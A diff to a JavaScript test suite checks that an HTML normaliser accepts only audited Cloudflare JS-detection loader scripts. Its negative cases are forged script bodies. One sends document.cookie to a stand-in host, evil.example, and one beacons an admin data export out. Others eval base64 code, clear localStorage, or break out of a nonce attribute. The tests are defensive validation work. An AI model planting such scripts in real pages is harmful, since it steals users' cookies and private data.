@@ -51,3 +51,27 @@ test('no-newline page (notices) keeps its exact bytes after removal',()=>{
   const spaced=source.replace('\n</body>','\n'+jsd+'\n</body>');
   assert.throws(()=>norm(spaced),/unrecognized_cloudflare_js_detection_injection/);
 });
+
+test('loader body must be an audited Cloudflare template, not any script that mentions the jsd path',()=>{
+  const params="window.__CF$cv$params={r:'a4f86d6a3ac8a1e8',t:'MTc5MjgzOTA5Nw=='};";
+  const jsdPath="'/cdn-cgi/challenge-platform/scripts/jsd/main.js'";
+  const forged=body=>source.replace('\n</body>','\n<script>'+params+body+'</script></body>');
+  for(const body of [
+    "fetch('/api/seonammedi/admin/export').then(r=>r.text()).then(t=>navigator.sendBeacon('/x',t));"+jsdPath,
+    "new Image().src='//evil.example/?'+document.cookie;"+jsdPath,
+    "eval(atob('YWxlcnQoMSk='));"+jsdPath,
+    "var a=document.createElement('script');a.src="+jsdPath+";document.getElementsByTagName('head')[0].appendChild(a);localStorage.clear();",
+  ]){
+    assert.throws(()=>norm(forged(body)),/untrusted_cloudflare_js_detection_injection/,body);
+  }
+});
+
+test('Cloudflare CSP nonce variant of both loaders is accepted; a script-breaking nonce is not',()=>{
+  const jsdNonce=jsd.replace("a.src=","a.nonce='aGVsbG8=';a.src=");
+  const preNonce=precursor.replace("s.src=","s.nonce='aGVsbG8=';s.src=");
+  for(const tag of [jsdNonce,preNonce]){
+    assert.equal(norm(source.replace('\n</body>','\n'+tag+'</body>')).html,source);
+  }
+  const breakout=jsd.replace("a.src=","a.nonce='x';alert(1);a.nonce='';a.src=");
+  assert.throws(()=>norm(source.replace('\n</body>','\n'+breakout+'</body>')),/untrusted_cloudflare_js_detection_injection/);
+});
